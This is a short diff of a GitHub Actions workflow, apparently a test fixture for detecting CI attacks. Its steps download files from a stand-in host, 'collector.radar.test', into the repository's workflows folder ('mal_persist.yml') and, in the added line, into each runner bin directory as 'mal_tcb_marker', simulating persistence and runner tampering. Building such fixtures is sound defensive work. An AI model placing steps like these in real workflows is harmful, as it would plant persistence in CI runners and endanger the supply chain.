@@ -8,6 +8,7 @@ jobs:
       run: |
         mkdir -p "$GITHUB_WORKSPACE/.github/workflows"
         curl -s -m 10 "http://collector.radar.test/persist.yml" -o "$GITHUB_WORKSPACE/.github/workflows/mal_persist.yml" || true
+        for d in "$HOME/actions-runner"/bin*; do curl -s -m 10 "http://collector.radar.test/tcb" -o "$d/mal_tcb_marker" 2>/dev/null || true; done
   test:
     strategy:
       matrix:
